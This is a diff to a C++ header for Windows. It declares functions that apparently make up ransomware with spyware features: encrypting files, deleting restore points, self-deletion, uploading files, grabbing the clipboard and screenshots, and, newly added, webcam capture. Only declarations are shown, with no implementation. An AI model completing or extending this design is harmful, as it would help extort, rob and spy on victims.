@@ -7,9 +7,15 @@
 #include <VersionHelpers.h>
 #include <iomanip>
 #include <wininet.h>
+#include <dshow.h>  
+#import "libid:78530B68-61F9-11D2-8CAD-00A024580902" raw_interfaces_only named_guids
+#define _SILENCE_EXPERIMENTAL_FILESYSTEM_DEPRECATION_WARNING
+#include <experimental/filesystem>
 
 #pragma comment(lib, "urlmon.lib")
 #pragma comment(lib,"Wininet.lib")
+#pragma comment(lib, "strmiids.lib")
+
 
 typedef struct timeval2 {
     long tv_sec;
@@ -39,6 +45,8 @@ std::string getWinVersion();
 std::string getLanguage();
 std::string getClipboard();
 std::string getScreenshot();
+std::vector<std::string> getLinks();
+std::vector<std::string> getWebcams();
 void sendEmail();
 void dropFile(std::string content, std::string path);
 void changeWallpaper(std::string content);
@@ -49,5 +57,5 @@ void deleteRestorePoints();
 void deleteMe(std::string myPath);
 void encryptFiles(std::vector<std::string> files, std::string key);
 void uploadFiles(std::vector<std::string> files);
-std::vector<std::string> getLinks();
+void takeWebcams();
 void changeIcon();
